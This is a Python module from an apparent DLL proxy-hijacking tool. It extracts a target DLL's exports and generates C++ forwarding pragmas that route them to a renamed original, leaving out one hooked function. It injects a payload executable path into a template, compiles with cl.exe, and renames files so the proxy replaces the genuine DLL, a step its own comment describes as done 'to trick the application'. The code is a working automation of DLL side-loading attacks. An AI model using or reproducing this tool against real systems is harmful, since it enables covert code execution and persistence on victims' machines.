import os
import subprocess
import shutil
import sys

# Relative imports
from ..utils.ui import log, Colors
from .analyzer import get_exports

def compile_proxy(cpp_file, output_dll_base):
    """
    Compiles the C++ file and returns True if successful, False otherwise.
    """
    log("Compiling with MSVC (cl.exe)...", "STEP")
    
    # Check if cl.exe exists
    if subprocess.call("where cl", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        log("cl.exe not found. Run inside 'Native Tools Command Prompt'.", "ERROR")
        return False

    output_dll = f"{output_dll_base}.dll"
    # /LD creates a DLL, /nologo hides copyright info
    cmd = ["cl", cpp_file, "/LD", "/nologo", f"/Fe:{output_dll}"]
    
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
        if proc.returncode == 0:
            log(f"Compiled successfully: {output_dll}", "SUCCESS")
            # Clean up artifacts (.obj, .lib, .exp)
            for ext in [".obj", ".lib", ".exp"]:
                temp = output_dll_base + ext
                if os.path.exists(temp): os.remove(temp)
            return True
        else:
            log("Compilation failed. Check syntax or environment.", "ERROR")
            print(f"{Colors.FAIL}{proc.stdout}{Colors.ENDC}")
            return False
    except Exception as e:
        log(f"Compiler error: {e}", "ERROR")
        return False

def swap_files(original_dll_path, proxy_dll_path):
    """
    Automates the deployment:
    1. Renames Original.dll -> Original_real.dll
    2. Renames Proxy.dll    -> Original.dll
    """
    try:
        directory = os.path.dirname(os.path.abspath(original_dll_path))
        filename = os.path.basename(original_dll_path)
        base_name = os.path.splitext(filename)[0]
        
        real_dll_name = f"{base_name}_real.dll"
        real_dll_path = os.path.join(directory, real_dll_name)
        
        # 1. Rename Original -> Original_real
        if os.path.exists(real_dll_path):
            log(f"Backup file '{real_dll_name}' already exists. Skipping rename of original.", "WARN")
        else:
            log(f"Renaming original: {filename} -> {real_dll_name}", "STEP")
            os.rename(original_dll_path, real_dll_path)

        # 2. Rename Proxy -> Original
        # The proxy is currently named whatever 'output_name' was (e.g., MyProxy.dll)
        # We need it to become 'MyDll.dll' to trick the application.
        target_proxy_path = os.path.join(directory, filename)
        
        if os.path.exists(proxy_dll_path):
            log(f"Deploying proxy: {os.path.basename(proxy_dll_path)} -> {filename}", "STEP")
            
            # If a file with the original name exists (and it's not the one we just renamed), remove it
            if os.path.exists(target_proxy_path) and target_proxy_path != real_dll_path:
                os.remove(target_proxy_path)
                
            os.rename(proxy_dll_path, target_proxy_path)
            log("Deployment complete! The folder is ready.", "SUCCESS")
        else:
            log(f"Could not find compiled proxy at {proxy_dll_path}", "ERROR")

    except Exception as e:
        log(f"Error during file swapping: {e}", "ERROR")
        log("You may need to rename files manually.", "WARN")

def generate_proxy(dll_path, template_path, output_name, hook_func, payload_exe, compile_flag):
    # 1. Get Exports
    exports = get_exports(dll_path, silent=True)
    if not exports:
        log("No exports found in target DLL.", "ERROR")
        return

    if not os.path.exists(template_path):
        log(f"Template '{template_path}' missing.", "ERROR")
        return

    log(f"Processing template from {template_path}...", "STEP")
    
    # 2. Prepare Pragma Links
    pragma_lines = []
    # This MUST match the filename we will rename the original to
    real_dll_name = os.path.splitext(os.path.basename(dll_path))[0] + "_real"
    
    count = 0
    for item in exports:
        func = item['raw_name']
        if func == hook_func:
            log(f"Intercepting function: {func}", "INFO")
            continue
        
        # Forwarding logic
        line = f'#pragma comment(linker, "/export:{func}={real_dll_name}.{func}")'
        pragma_lines.append(line)
        count += 1
    
    # 3. Write C++ File
    try:
        with open(template_path, "r", encoding="utf-8") as f:
            content = f.read()
        
        final_code = content.replace("{{PROXY_EXPORTS}}", "\n".join(pragma_lines))
        final_code = final_code.replace("{{HOOK_FUNC}}", hook_func)
        final_code = final_code.replace("{{PROXY_DLL_NAME}}", real_dll_name)
        final_code = final_code.replace("{{EXEC_HOOK_FILE}}", payload_exe)
        
        out_cpp = f"{output_name}.cpp"
        with open(out_cpp, "w", encoding="utf-8") as f:
            f.write(final_code)
            
        log(f"Generated {out_cpp} (Forwarding {count} functions).", "SUCCESS")
        
        # 4. Compile & Swap (Automation Logic)
        if compile_flag:
            success = compile_proxy(out_cpp, output_name)
            if success:
                # Perform the automatic renaming
                compiled_proxy_dll = f"{output_name}.dll"
                swap_files(dll_path, compiled_proxy_dll)
            
    except Exception as e:
        log(f"Generation failed: {e}", "ERROR")